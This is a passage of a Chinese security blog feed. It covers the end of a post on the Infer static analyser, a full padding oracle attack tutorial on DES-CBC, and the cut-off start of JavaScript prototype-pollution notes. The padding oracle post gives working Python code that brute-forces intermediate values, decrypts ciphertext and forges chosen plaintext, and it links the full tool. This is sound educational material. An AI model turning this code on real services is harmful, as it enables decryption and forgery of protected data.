class="keyword">void</span> <span class="title">merge</span><span class="params">(lst_nd *x,lst_nd *y)</span></span>&#123;<span class="comment">//SUMMARY ONLY </span></span><br><span class="line">    <span class="comment">// Given Pre: list(x) * list(y)</span></span><br><span class="line">    <span class="comment">// x=x+y</span></span><br><span class="line">&#125; <span class="comment">// Given Post: list(x)</span></span><br></pre></td></tr></table></figure><p>要分析merge有没有空指针，有</p><script type="math/tex; mode=display">\{x\mapsto list * y\mapsto list\}merge(x,y)\{x\mapsto list\}</script><p>如果开始分析q到第5行，我们有：</p><script type="math/tex; mode=display">A=x\mapsto 0 *z \mapsto 0</script><p>但是我们的前提条件是$G=x\mapsto list * y\mapsto list$那么开始推导：</p><script type="math/tex; mode=display">x\mapsto0 *z \mapsto 0 * ?antiframe \vdash x\mapsto list * y \mapsto list * ?frame</script><p>因此 $antiframe=y\mapsto list$且$frame=z\mapsto 0$，这说明，如果想要分析q()函数有没有空指针，那么我们现在只需要分析$y\mapsto list$是成立就行了。</p><p><strong>这意味着，如果将来发新版本，若q()函数不变，则不需要再分析该函数，只需要分析改变的那些函数有没有改变$y \mapsto list$即可。</strong></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Infer目前的检测能力只局限于空指针和数据泄露问题，然而在检测项中发现了更多，怀疑是开源的是缩水的版本，而其增量分析的思想值得扫描器借鉴，其可用来完成commit级别的SAST和Serveless的安全检测。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Infer作为facebook 开源的使用 ocaml 开发静态代码检测工具，作为公司的产品调研对象，本文就其使用和原理两方面进行分析。&lt;/p&gt;&lt;p&gt;GitHub：&lt;a href=&quot;https://github.com/facebook/infer&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/facebook/infer&lt;/a&gt;&lt;/p&gt;&lt;p&gt;教程：&lt;a href=&quot;https://infer.liaohuqiu.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://infer.liaohuqiu.net/&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="源码安全" scheme="http://anemone.top/categories/%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="源码安全" scheme="http://anemone.top/tags/%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
      <category term="C/C++" scheme="http://anemone.top/tags/C-C/"/>
    
      <category term="Infer" scheme="http://anemone.top/tags/Infer/"/>
    
  </entry>
  
  <entry>
    <title>PaddingOracle攻击</title>
    <link href="http://anemone.top/crypto-PaddingOracle%E6%94%BB%E5%87%BB/"/>
    <id>http://anemone.top/crypto-PaddingOracle攻击/</id>
    <published>2019-07-15T12:30:49.000Z</published>
    <updated>2019-09-22T10:14:18.584Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CBC加密原理"><a href="#CBC加密原理" class="headerlink" title="CBC加密原理"></a>CBC加密原理</h1><p>先预习下CBC的加解密原理吧。</p><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>如下图所示，CBC的加密步骤如下：</p><ol><li>对明文分组，每组长度通常为8或16字节，末尾分组需要填充，通常填充采用PKCS#5标准；</li><li>生成初始化向量IV，长度为分组长度；</li><li>对于第一个明文分组，先由IV异或明文分组1得到中间值，再通过对称加密（DES/AEC/etc）得到密文分组1；</li><li>对于接下来的分组，由上一个密文分组替代IV算得中间值，再通过对称加密（DES/AEC/etc）得到密文分组2,3,4……</li></ol><a id="more"></a><p><img src="/crypto-PaddingOracle攻击/1563006823645.png" alt="加密"></p><p>给出加密的Java代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encrypt</span><span class="params">(String plain, String key)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] keyBytes = key.getBytes(charset);</span><br><span class="line">    <span class="keyword">byte</span>[] plainBytes = plain.getBytes(charset);</span><br><span class="line">    SecretKeySpec keySpec = <span class="keyword">new</span> SecretKeySpec(keyBytes, <span class="string">"DES"</span>);</span><br><span class="line">    Cipher cipher = Cipher.getInstance(<span class="string">"DES/CBC/PKCS5Padding"</span>);<span class="comment">//"算法/模式/补码方式"</span></span><br><span class="line">    cipher.init(Cipher.ENCRYPT_MODE, keySpec);</span><br><span class="line">    <span class="keyword">byte</span>[] iv = cipher.getIV();</span><br><span class="line">    <span class="keyword">byte</span>[] encrypted = cipher.doFinal(plain.getBytes(charset));</span><br><span class="line">    <span class="keyword">return</span> bytes2HexStr(iv)+<span class="string">"::"</span>+bytes2HexStr(encrypted);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，算法输入是明文（plain）和密钥（key），返回是初始化向量（iv）和加密后的密文（encrypted）。</p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>如下图所示，CBC的解密步骤如下：</p><ol><li>将密文分组；</li><li>对于第一个密文分组，先经过对称加密算法解密得到中间值，再由初始化向量IV异或中间值得到明文分组1；</li><li>对于接下来的密文分组，由经过对称加密算法解密得到中间值，再上一个密文分组代替IV异或得到明文分组2,3,4……；</li></ol><p><img src="/crypto-PaddingOracle攻击/1563012736837.png" alt="1563012736837"></p><p>给出Java版解密代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">decrypt</span><span class="params">(String secret, String key, String iv)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] keyBytes = key.getBytes(charset);</span><br><span class="line">    <span class="keyword">byte</span>[] secretBytes = hexStr2Bytes(secret);<span class="comment">//先用base64解密</span></span><br><span class="line">    <span class="keyword">byte</span>[] ivBytes = hexStr2Bytes(iv);</span><br><span class="line"></span><br><span class="line">    IvParameterSpec ivs = <span class="keyword">new</span> IvParameterSpec(ivBytes);</span><br><span class="line">    SecretKeySpec keySpec = <span class="keyword">new</span> SecretKeySpec(keyBytes, <span class="string">"DES"</span>);</span><br><span class="line">    Cipher cipher = Cipher.getInstance(<span class="string">"DES/CBC/PKCS5Padding"</span>);</span><br><span class="line">    cipher.init(Cipher.DECRYPT_MODE, keySpec, ivs);</span><br><span class="line">    <span class="keyword">byte</span>[] plain = cipher.doFinal(secretBytes);</span><br><span class="line">    String plainString = <span class="keyword">new</span> String(plain,charset);</span><br><span class="line">    <span class="keyword">return</span> plainString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见输入是密文（secret）、密码（key）、初始化向量（iv）——这正与加密的输入对应，输出是明文（plainString）。</p><h2 id="PKCS-5填充方案"><a href="#PKCS-5填充方案" class="headerlink" title="PKCS#5填充方案"></a>PKCS#5填充方案</h2><p>这里再提一下PKCS#5方案，简单说就是缺多少位补多少，补内容就是缺位数的int值，例如：需要加密的串为“FIG”，而分组长度为8，那么缺5位，因此补完为“FIG\x05\x05\x05\x05\x05”，注意即使长度正巧为8，也需要补上一个完整分组，以检查加密正确性。</p><p><img src="/crypto-PaddingOracle攻击/1999562-43a6dede0db2bd18.png" alt="img"></p><p>在解密完最后一个分组后，先会检查Padding是否合法（注意，这是发起Oracle Padding攻击的关键）</p><p>com.sun.crypto.provider.CipherCore#unpad():</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">unpad</span><span class="params">(<span class="keyword">int</span> len, <span class="keyword">byte</span>[] intermidVal)</span> <span class="keyword">throws</span> BadPaddingException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="keyword">this</span>.padding.unpad(intermidVal, <span class="number">0</span>, len);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> BadPaddingException(<span class="string">"Given final block not properly padded. Such issues can arise if a bad key is used during decryption."</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>com.sun.crypto.provider.PKCS5Padding#unpad():</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> plain 解密字符串</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> startIdx 开始下标</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> length 字符串长度</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> paddingVal</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">unpad</span><span class="params">(<span class="keyword">byte</span>[] plain, <span class="keyword">int</span> startIdx, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (plain != <span class="keyword">null</span> &amp;&amp; length != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> totalLength = Math.addExact(startIdx, length);</span><br><span class="line">        <span class="keyword">byte</span> tailVal = plain[totalLength - <span class="number">1</span>]; <span class="comment">// 解密后明文的最后一个字符</span></span><br><span class="line">        <span class="keyword">int</span> unsignedTailVal = tailVal &amp; <span class="number">255</span>;</span><br><span class="line">        <span class="keyword">if</span> (unsignedTailVal &gt;= <span class="number">1</span> &amp;&amp; unsignedTailVal &lt;= <span class="keyword">this</span>.blockSize) &#123;</span><br><span class="line">            <span class="keyword">int</span> paddingStartIdx = totalLength - unsignedTailVal;</span><br><span class="line">            <span class="comment">// tailVal==unsignedTailVal</span></span><br><span class="line">            <span class="keyword">if</span> (paddingVal &lt; startIdx) &#123;</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i = paddingStartIdx; i &lt; totalLength; ++i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (plain[i] != tailVal) &#123;</span><br><span class="line">                        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> paddingVal;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="推导原中间值"><a href="#推导原中间值" class="headerlink" title="推导原中间值"></a>推导原中间值</h1><p>假设<code>plain=123456789</code>，<code>key=keykeyke</code>，加密得到<code>iv(hexcoded)=c86518374d219a7e</code>,<code>secret(hexcoded)=c8c9c4f092468f9e75b520a3ea1832c0</code></p><p>作为攻击者，目前我们知晓的是iv和secret，攻击的第一步是调整iv得到中间值：</p><p><img src="/crypto-PaddingOracle攻击/1563019123084.png" alt="1563019123084"></p><p>抽取第一块出来看，如果我们调用<code>decode(&quot;c8c9c4f092468f9e&quot;,key,&quot;0000000000000000&quot;)</code>——再次注意，<strong>能控制的只有secret和iv，key变量未知也不可控</strong>，上文函数势必会报错，因为Padding不合法：</p><p><img src="/crypto-PaddingOracle攻击/1563075246744.png" alt="1563075246744"></p><p>那么此时（最可能）合法的Padding是什么呢？不难想到应该是0x01，即Plain Text &amp; Padding应该为”???????\x01“</p><h2 id="爆破辅助IV-1"><a href="#爆破辅助IV-1" class="headerlink" title="爆破辅助IV[-1]"></a>爆破辅助IV[-1]</h2><p>控制secret不变，IV清零，先爆破(合法的辅助)iv最后一位，若结束位为0x01则程序不再报错，反之程序报错（这里可以解释下上文说的“最可能”的含义，因为异或后有可能解密后plainText[-2]=0x02，那么合法的padding也可以是\0x02——也就是说结束位为0x02程序也不报错，也有可能plainText[-3]=plainText[-2]=0x03，那么合法的padding也可以是0x03，这样的概率出现的实在是太少了，即使是最后一个分组，由于我们已经清零了IV，因此也不会发生这种情况）。</p><p>因此有如下脚本，得到了合法的最后一位是“47”：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">burp_iv</span><span class="params">(secret: bytearray, iv: bytearray, pos: int)</span>-&gt;int:</span></span><br><span class="line">    <span class="keyword">for</span> iv_byte <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        iv[pos]=iv_byte</span><br><span class="line">        <span class="comment">#对java的函数的封装，当报错时返回-1。</span></span><br><span class="line">        ret=decode(secret, iv)</span><br><span class="line">        logging.info(<span class="string">"&#123;0&#125;::&#123;1&#125;"</span>.format(iv.hex(),ret))</span><br><span class="line">        <span class="keyword">if</span> ret!=<span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> iv_byte</span><br></pre></td></tr></table></figure><p><img src="/crypto-PaddingOracle攻击/1563075623114.png" alt="1563075623114"></p><h2 id="更新中间值"><a href="#更新中间值" class="headerlink" title="更新中间值"></a>更新中间值</h2><p>根据上文分析，我们猜测最后一位padding是<code>0x01</code>，并且<code>?^0x47=0x01</code>，那么<code>?=0x01^0x47=0x46</code>，由此中间值的最后一位就是<code>0x46</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">legal_iv_byte=burp_iv(secret, fake_legal_iv,i) <span class="comment"># 0x47</span></span><br><span class="line"><span class="comment"># 更新intermediary value</span></span><br><span class="line">intermedi_byte=padding^legal_iv_byte <span class="comment"># 0x01^0x47 </span></span><br><span class="line">intermedi[i]=intermedi_byte <span class="comment"># 0x46</span></span><br></pre></td></tr></table></figure><p><img src="/crypto-PaddingOracle攻击/1563075737764.png" alt="1563075737764"></p><h2 id="更新辅助IV"><a href="#更新辅助IV" class="headerlink" title="更新辅助IV"></a>更新辅助IV</h2><p>接下来推第二位，此时我们假设(最有可能的合法)padding值应该是0x02，首先让最后一位合法——<code>IV[-1]^0x46=0x02</code>，即更新<code>IV[-1]=0x02^0x46=0x44</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新iv</span></span><br><span class="line">padding+=<span class="number">1</span> <span class="comment"># padding=0x02</span></span><br><span class="line">legal_iv_byte=padding^intermedi_byte <span class="comment"># 0x44</span></span><br><span class="line">fake_legal_iv[<span class="number">-1</span>]=legal_iv_byte</span><br></pre></td></tr></table></figure><p><img src="/crypto-PaddingOracle攻击/1563075936620.png" alt="1563075936620"></p><h2 id="爆破辅助IV-2"><a href="#爆破辅助IV-2" class="headerlink" title="爆破辅助IV[:-2]"></a>爆破辅助IV[:-2]</h2><p>用爆破第一位的相同方法，得到第二位IV为0xAF，再得到第二位中间值为0xAD：</p><p><img src="/crypto-PaddingOracle攻击/1563074854405.png" alt="1563074854405"></p><p>再更新辅助IV爆破第三位，以此类推，可以整个中间值<code>f9572b037817ad46</code>：</p><p><img src="/crypto-PaddingOracle攻击/1563074654217.png" alt="1563074654217"></p><p>即最多花费<code>256*len(block)</code>次尝试，可以得到整个中间值，此时辅助IV的任务已经完成。</p><p>而此时，攻击者需要的只是<strong>secret</strong>和<strong>分组长度</strong>。</p><p>另外，不论对于哪一个分组（即使是最后一个填充分组），进行的操作都是一样的。</p><h1 id="推导原明文"><a href="#推导原明文" class="headerlink" title="推导原明文"></a>推导原明文</h1><p>知道中间值之后，由<code>Intermediary ^ IV = Plain</code> 推导原明文，注意这里是真实的IV，而不是之前的辅助IV。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">burp_plain</span><span class="params">(intermedi: bytearray, iv: bytearray)</span>-&gt;bytearray:</span></span><br><span class="line">    block_len=len(intermedi)</span><br><span class="line">    plain=bytearray.fromhex(<span class="string">"00"</span>*block_len)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(block_len):</span><br><span class="line">        plain[i]=intermedi[i]^iv[i]</span><br><span class="line">    logging.info(<span class="string">"Get Plain Value: &#123;&#125;"</span>.format(plain.hex()))</span><br><span class="line">    <span class="keyword">return</span> plain</span><br></pre></td></tr></table></figure><p>对于第一个分组，IV就是初始IV；对于后面的分组，IV为上一分组的密文，以此可以推导全部明文：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(secret: bytearray, iv: bytearray)</span>-&gt;bytearray:</span></span><br><span class="line">    plain=bytearray()</span><br><span class="line">    block_len=len(iv)</span><br><span class="line">    real_iv=iv</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(secret),<span class="number">8</span>):</span><br><span class="line">        block_secret=secret[i:i+<span class="number">8</span>]</span><br><span class="line">        intermedi=burp_intermediary(block_secret, block_len)</span><br><span class="line">        plain+=burp_plain(intermedi, real_iv)</span><br><span class="line">        real_iv=secret[i:i+<span class="number">8</span>]</span><br><span class="line">    logging.info(<span class="string">"Get Full Plain: &#123;&#125;"</span>.format(plain.hex()))</span><br><span class="line">    <span class="keyword">return</span> plain</span><br></pre></td></tr></table></figure><p>梳理一下，在知晓secret和iv的情况下，攻击者先推导中间值，接着推导原明文。</p><h1 id="伪造明文"><a href="#伪造明文" class="headerlink" title="伪造明文"></a>伪造明文</h1><p>推导出<strong>中间值</strong>后，可以伪造新明文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">∵ intermediary ^ new_iv = fake_plain</span><br><span class="line">∴ fake_iv=intermediary ^ fake_plain</span><br></pre></td></tr></table></figure><p>我们先构造一个长度在一个分组长度内的密文，比如“7654321”：</p><ol><li>PKCS#5填充，得到“7654321\x01”</li><li><code>new_iv=b&quot;\xf9\x57\x2b\x03\x78\x17\xad\x46&quot; ^ b&quot;7654321\x01&quot;=b&quot;\xce\x61\x1e\x37\x4b\x25\x9c\x47&quot;</code></li><li>decode(“c8c9c4f092468f9e”,key,“ce611e374b259c47”) = “7654321”</li></ol><p>代码实现如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_block</span><span class="params">(secret_block: bytearray, fake_plain: bytearray)</span>-&gt;(bytearray, bytearray):</span></span><br><span class="line">    block_len=len(secret_block)</span><br><span class="line">    <span class="keyword">if</span> len(fake_plain)&lt;block_len:</span><br><span class="line">        fake_plain=pkcs5(fake_plain, block_len)</span><br><span class="line"></span><br><span class="line">    intermedi=burp_intermediary(secret_block, block_len)</span><br><span class="line">    iv=bytearray(block_len) </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(block_len):</span><br><span class="line">        iv[i]=intermedi[i]^fake_plain[i]</span><br><span class="line">    logging.info(<span class="string">"Fake IV: &#123;0&#125;, Secret: &#123;1&#125;"</span>.format(iv.hex(), secret_block.hex()))</span><br><span class="line">    <span class="keyword">return</span> iv, secret_block</span><br></pre></td></tr></table></figure></p><p>可以看到，算法输入实际上只有需要加密的<strong>明文</strong>（<strong>secret</strong>可以为任意值），输出实际上只有iv（secret原样返回）。</p><h2 id="伪造任意长度的明文"><a href="#伪造任意长度的明文" class="headerlink" title="伪造任意长度的明文"></a>伪造任意长度的明文</h2><p>根据CBC的解密流程，将最后一块加密产生的IV作为倒数第二块的secret，以前的倒数第i块IV作为倒数第i-1块的secret，依次向前算得所有密文，最后产生的IV作为初始IV。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(plain: bytearray, block_len: int)</span>-&gt;bytearray:</span></span><br><span class="line">    idxs=list(range(<span class="number">0</span>, len(plain), block_len))</span><br><span class="line">    secret=bytearray()</span><br><span class="line">    secret_block=bytearray(block_len)</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> idxs[::<span class="number">-1</span>]:</span><br><span class="line">        iv, secret_block=encrypt_block(secret_block, plain[idx:idx+<span class="number">8</span>])</span><br><span class="line">        secret=secret_block+secret</span><br><span class="line">        secret_block=iv</span><br><span class="line"></span><br><span class="line">    logging.info(<span class="string">"IV: &#123;0&#125;, Secret: &#123;1&#125;"</span>.format(iv.hex(), secret.hex()))</span><br><span class="line">    <span class="keyword">return</span> iv, secret</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>整理一下，在攻击者知晓加密方式为AES/DES-CBC，密文以及初始化向量长度后，可以解密原中间值；攻击者知晓密文以及初始化向量值后，可以进一步解密原明文；攻击者在只知晓加密方式为AES/DES-CBC情况下，可以伪造明文，当然整个大前提是攻击者可以多次调用解密程序，并且解密程序在padding不合法时报错。</p><p><strong>代码：</strong><a href="https://github.com/Anemone95/padding-oracle-attack" target="_blank" rel="noopener">https://github.com/Anemone95/padding-oracle-attack</a></p><h1 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h1><ol><li>Automated Padding Oracle Attacks With PadBuster，<a href="https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html" target="_blank" rel="noopener">https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html</a></li><li>Padding Oracle，<a href="https://www.jianshu.com/p/1851f778e579" target="_blank" rel="noopener">https://www.jianshu.com/p/1851f778e579</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;CBC加密原理&quot;&gt;&lt;a href=&quot;#CBC加密原理&quot; class=&quot;headerlink&quot; title=&quot;CBC加密原理&quot;&gt;&lt;/a&gt;CBC加密原理&lt;/h1&gt;&lt;p&gt;先预习下CBC的加解密原理吧。&lt;/p&gt;&lt;h2 id=&quot;加密&quot;&gt;&lt;a href=&quot;#加密&quot; class=&quot;headerlink&quot; title=&quot;加密&quot;&gt;&lt;/a&gt;加密&lt;/h2&gt;&lt;p&gt;如下图所示，CBC的加密步骤如下：&lt;/p&gt;&lt;ol&gt;
&lt;li&gt;对明文分组，每组长度通常为8或16字节，末尾分组需要填充，通常填充采用PKCS#5标准；&lt;/li&gt;
&lt;li&gt;生成初始化向量IV，长度为分组长度；&lt;/li&gt;
&lt;li&gt;对于第一个明文分组，先由IV异或明文分组1得到中间值，再通过对称加密（DES/AEC/etc）得到密文分组1；&lt;/li&gt;
&lt;li&gt;对于接下来的分组，由上一个密文分组替代IV算得中间值，再通过对称加密（DES/AEC/etc）得到密文分组2,3,4……&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="密码学" scheme="http://anemone.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="http://anemone.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
      <category term="CBC" scheme="http://anemone.top/tags/CBC/"/>
    
      <category term="PaddingOracle" scheme="http://anemone.top/tags/PaddingOracle/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript原型链污染学习笔记</title>
    <link href="http://anemone.top/JS-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>http://anemone.top/JS-原型链污染/</id>
    <published>2019-05-05T13:14:20.000Z</published>
    <updated>2019-09-22T10:14:18.575Z</updated>
    
    <content type="html"><![CDATA[<h1 id="prototype和-proto"><a href="#prototype和-proto" class="headerlink" title="prototype和__proto__"></a><code>prototype</code>和<code>__proto__</code></h1><h2 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a><code>prototype</code></h2><p>Javascript的类是通过构造函数创建的，而给类增加方法则需要使用prototype，类似于设计模式中的原型模式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.bar = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Foo.prototype.show = <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.bar)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> Foo()</span><br><span class="line">foo.show()</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="proto"><a href="#proto" class="headerlink" title="__proto__"></a><code>__proto__</code></h2><p><code>prototype</code>只能在类（换句话说，构造函数）上使用，如果想在实体化的类上使用则需要使用<code>__proto__</code>属性，即：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.__proto__.show == Foo.prototype.show</span><br></pre></td></tr></table></figure><h1 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h1><p>子类将其prototype赋值为一个父类对象实例，表示其继承父类。对于子对象的属性，若其不存在，则会递归查找其父对象，举例说明：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.first_name = <span class="string">'Donald'</span></span><br><span class="line">    <span class="keyword">this</span>.last_name = <span class="string">'Trump'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.first_name = <span class="string">'Melania'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son()</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>) <span class="comment">//输出Melania 